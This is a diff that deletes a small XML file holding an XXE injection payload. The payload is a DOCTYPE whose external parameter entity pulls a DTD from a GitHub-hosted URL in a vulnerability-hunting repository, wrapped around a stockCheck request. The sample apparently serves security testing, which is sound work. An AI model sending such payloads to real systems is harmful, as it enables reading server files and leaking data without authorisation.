@@ -1,3 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://raw.githubusercontent.com/ohadzr/vulnhuntr/refs/heads/main/vulnhuntr/our.dtd"> %xxe;]>
-<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
